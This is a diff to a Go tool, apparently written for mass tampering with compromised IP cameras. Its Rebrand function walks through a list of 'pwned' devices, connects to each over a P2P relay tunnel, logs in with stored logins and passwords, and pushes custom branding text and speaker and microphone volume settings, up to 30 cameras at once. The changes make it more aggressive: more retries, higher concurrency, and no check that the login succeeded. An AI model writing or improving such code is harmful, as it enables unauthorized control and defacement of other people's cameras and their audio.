@@ -72,20 +72,19 @@ func Rebrand(outDir string, config *Config) {
 	fmt.Printf("[found] > %d cameras\n", len(entries))
 	fmt.Println()
 
-	retries := 3
-	if val, err := getIntValue(config.Scan.Retries); err == nil {
+	retries := 5
+	if val, err := getIntValue(config.Scan.Retries); err == nil && val > retries {
 		retries = val
 	}
 
 	var (
-		mu          sync.Mutex
-		wg          sync.WaitGroup
+		mu           sync.Mutex
+		wg           sync.WaitGroup
 		successCount int
 		failCount    int
 	)
 
-	// Process with limited concurrency
-	sem := make(chan struct{}, 20)
+	sem := make(chan struct{}, 30)
 
 	for i, entry := range entries {
 		sem <- struct{}{}
@@ -99,20 +98,21 @@ func Rebrand(outDir string, config *Config) {
 			current := idx + 1
 			mu.Unlock()
 
-			// Connect and authenticate
 			for attempt := 0; attempt < retries; attempt++ {
+				if attempt > 0 {
+					time.Sleep(time.Duration(attempt) * 1 * time.Second)
+				}
+
 				client := p2p.NewDHClient(e.Serial, false)
-				client.SetRetries(retries)
+				client.SetRetries(3)
 
 				if err := client.Handshake(); err != nil {
 					client.Close()
-					time.Sleep(500 * time.Millisecond)
 					continue
 				}
 
 				if err := client.PTCPHandshake(); err != nil {
 					client.Close()
-					time.Sleep(500 * time.Millisecond)
 					continue
 				}
 
@@ -121,7 +121,6 @@ func Rebrand(outDir string, config *Config) {
 					directOK = false
 					if err := client.CompleteRelayHandshake(); err != nil {
 						client.Close()
-						time.Sleep(500 * time.Millisecond)
 						continue
 					}
 				}
@@ -138,19 +137,25 @@ func Rebrand(outDir string, config *Config) {
 
 				tunnel.SetAuth(e.Login, e.Password)
 
-				// Verify auth works
-				if model, _, _, err := tunnel.GetDeviceInfo(); err != nil || model == "" {
-					tunnel.Disconnect()
-					close(stopHB)
-					client.Close()
-					time.Sleep(500 * time.Millisecond)
-					continue
+				// Try to get device info (model/channels)
+				model := e.Model
+				channels := e.Channels
+				if m, c, _, err := tunnel.GetDeviceInfo(); err == nil && m != "" {
+					model = m
+					if c > 0 {
+						channels = c
+					}
 				}
+
+				// Update entry with fresh data
+				currentEntry := e
+				currentEntry.Model = model
+				currentEntry.Channels = channels
 
 				// Apply branding
 				brandOK := true
 				if config.Brand.Enabled {
-					brandOK = applyBrandingToTunnel(tunnel, e.Serial, &e, config)
+					brandOK = applyBrandingToTunnel(tunnel, e.Serial, &currentEntry, config)
 				}
 
 				// Apply audio
@@ -159,13 +164,16 @@ func Rebrand(outDir string, config *Config) {
 					audioOK = applyAudioToTunnel(tunnel, config)
 				}
 
-				// Report
 				mu.Lock()
 				if brandOK && audioOK {
 					successCount++
 					fmt.Printf("\x1b[32m[%d/%d] OK\x1b[0m %s\n", current, len(entries), e.Serial)
-				} else {
+				} else if !brandOK && !audioOK {
+					// Both failed - likely not connected properly
 					failCount++
+					fmt.Printf("\x1b[91m[%d/%d] FAIL\x1b[0m %s (brand+audio failed)\n", current, len(entries), e.Serial)
+				} else {
+					successCount++
 					fmt.Printf("\x1b[33m[%d/%d] PARTIAL\x1b[0m %s (brand=%v audio=%v)\n", current, len(entries), e.Serial, brandOK, audioOK)
 				}
 				mu.Unlock()
@@ -176,10 +184,9 @@ func Rebrand(outDir string, config *Config) {
 				return
 			}
 
-			// All retries failed
 			mu.Lock()
 			failCount++
-			fmt.Printf("\x1b[91m[%d/%d] FAIL\x1b[0m %s (offline or auth failed)\n", current, len(entries), e.Serial)
+			fmt.Printf("\x1b[91m[%d/%d] FAIL\x1b[0m %s (all retries exhausted)\n", current, len(entries), e.Serial)
 			mu.Unlock()
 		}(i, entry)
 	}
@@ -193,7 +200,7 @@ func Rebrand(outDir string, config *Config) {
 
 func applyBrandingToTunnel(tunnel *p2p.PTCPTunnel, serial string, entry *PwnedEntry, config *Config) bool {
 	const maxRetries = 3
-	const retryDelay = 200 * time.Millisecond
+	const retryDelay = 300 * time.Millisecond
 
 	replacePlaceholders := func(tmpl string) string {
 		r := strings.ReplaceAll(tmpl, "{serial}", serial)
@@ -245,7 +252,7 @@ func applyBrandingToTunnel(tunnel *p2p.PTCPTunnel, serial string, entry *PwnedEn
 
 func applyAudioToTunnel(tunnel *p2p.PTCPTunnel, config *Config) bool {
 	const maxRetries = 3
-	const retryDelay = 200 * time.Millisecond
+	const retryDelay = 300 * time.Millisecond
 
 	for attempt := 0; attempt < maxRetries; attempt++ {
 		if err := tunnel.SetAudioVolume(config.Audio.SpeakerVolume, config.Audio.MicVolume); err == nil {
